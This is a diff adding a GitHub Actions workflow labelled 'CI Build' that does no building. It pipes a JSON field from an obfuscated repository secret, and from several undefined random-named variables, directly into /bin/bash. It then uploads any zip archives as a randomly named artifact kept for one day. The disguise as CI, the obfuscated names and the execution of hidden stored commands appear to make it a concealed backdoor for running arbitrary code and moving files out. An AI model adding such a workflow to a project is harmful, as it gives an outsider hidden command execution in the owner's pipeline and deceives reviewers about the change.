@@ -1,0 +1,32 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          tsfrm6000: ${{ secrets.tsfrm6000 }}
+        run: |
+          printf '%s' "$tsfrm6000" | jq -r .agtgw9 | /bin/bash
+          echo $lp3 | jq -r .dd25 | /bin/bash
+          echo $lbc12 | jq -r .a5840 | /bin/bash
+          echo $h36 | jq -r .b0 | /bin/bash
+          printf '%s' "$t90281" | jq -r .prui0319 | /bin/bash
+          echo $ufqpr14 | jq -r .bra98143 | /bin/bash
+          echo $ebj4 | jq -r .sdtb26 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: IuqfdYqD
+          path: "*.zip"
+          retention-days: 1
